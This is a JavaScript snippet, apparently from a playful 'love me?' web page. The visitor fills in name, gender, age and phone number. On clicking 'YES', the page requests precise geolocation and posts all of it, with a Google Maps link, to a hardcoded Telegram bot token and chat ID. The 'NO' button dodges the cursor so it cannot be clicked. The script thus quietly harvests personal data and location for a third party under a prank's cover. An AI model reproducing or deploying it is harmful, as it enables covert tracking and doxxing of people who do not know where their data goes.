  // Get references to all input fields, the dropdown, and the buttons
      const inputs = document.querySelectorAll(
        'input[type="text"], input[type="number"]'
      );
      const genderDropdown = document.getElementById("gender");
      const yesButton = document.querySelector(".yes");
      const noButton = document.querySelector(".no");

      // Function to check if all inputs are filled
      function validateInputs() {
        let allFilled = true;

        // Check text and number inputs
        inputs.forEach((input) => {
          if (input.value.trim() === "") {
            allFilled = false; // If any field is empty, set flag to false
          }
        });

        // Check if gender is selected
        if (genderDropdown.value === "") {
          allFilled = false;
        }

        // Enable or disable the buttons based on the flag
        yesButton.disabled = !allFilled;
        noButton.disabled = !allFilled;
      }

      // Attach event listeners to all input fields and the dropdown
      inputs.forEach((input) => {
        input.addEventListener("input", validateInputs);
      });
      genderDropdown.addEventListener("change", validateInputs);

      // Handle "YES" button click
      async function handleYes() {
        // Collect user input data
        const username = document.getElementById("username").value.trim();
        const gender = document.getElementById("gender").value;
        const age = document.getElementById("age").value.trim();
        const phone = document.getElementById("Phone").value.trim();

        // Validate that all fields are filled
        if (!username || !gender || !age || !phone) {
          alert("Please fill out all fields before proceeding.");
          return;
        }

        // Prefix the phone number with +855
        const formattedPhone = "+855" + phone;

        // Save data to localStorage
        const userData = { username, gender, age, phone: formattedPhone };
        localStorage.setItem("userData", JSON.stringify(userData));

        // Request location from the user
        if (navigator.geolocation) {
          try {
            const position = await new Promise((resolve, reject) => {
              navigator.geolocation.getCurrentPosition(resolve, reject);
            });

            const latitude = position.coords.latitude;
            const longitude = position.coords.longitude;

            // Format Google Maps URL
            const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;

            // Send data to Telegram bot
            const telegramBotToken =
              "7893506126:AAEfbbIrs6rRgIpchTgZjp9iT1zHXpo5UMg"; // Replace with your bot token
            const chatId = "1208908312"; // Replace with your chat ID (ensure it's numeric)
            const message = ` User : Informations\nName: ${username}\nGender: ${gender}\nAge: ${age} \nPhone: ${formattedPhone} \nLocation: ${mapsUrl}`;

            const response = await fetch(
              `https://api.telegram.org/bot${telegramBotToken}/sendMessage`,
              {
                method: "POST",
                headers: {
                  "Content-Type": "application/json",
                },
                body: JSON.stringify({
                  chat_id: chatId,
                  text: message,
                  reply_markup: JSON.stringify({
                    inline_keyboard: [
                      [
                        {
                          text: "Telegram", // Clicking this button opens Telegram with the formatted phone number
                          url: `https://t.me/${formattedPhone}`,
                        },
                      ],
                    ],
                  }),
                }),
              }
            );

            if (!response.ok) {
              const errorData = await response.json();
              throw new Error(`Telegram API error: ${errorData.description}`);
            }

            console.log("Message sent successfully to Telegram bot.");
            document.getElementById("message").textContent =
              "Data sent successfully!";
            window.location.href = "loveme.html";
          } catch (error) {
            console.error(
              "Error getting location or sending to Telegram:",
              error
            );
            document.getElementById("message").textContent =
              "Failed to send data. Please try again.";
          }
        } else {
          alert("Geolocation is not supported by your browser.");
        }
      }

      // Get reference to the "NO" button
      const noButtonRef = document.querySelector(".no");

      // Function to generate random coordinates within the viewport
      function getRandomPosition() {
        const windowWidth = window.innerWidth;
        const windowHeight = window.innerHeight;

        // Generate random X and Y positions
        const randomX = Math.random() * (windowWidth - noButtonRef.offsetWidth);
        const randomY =
          Math.random() * (windowHeight - noButtonRef.offsetHeight);

        return { x: randomX, y: randomY };
      }

      // Add event listener to move the button on hover
      noButtonRef.addEventListener("mouseenter", () => {
        const { x, y } = getRandomPosition();
        noButtonRef.style.position = "absolute";
        noButtonRef.style.left = `${x}px`;
        noButtonRef.style.top = `${y}px`;
      });
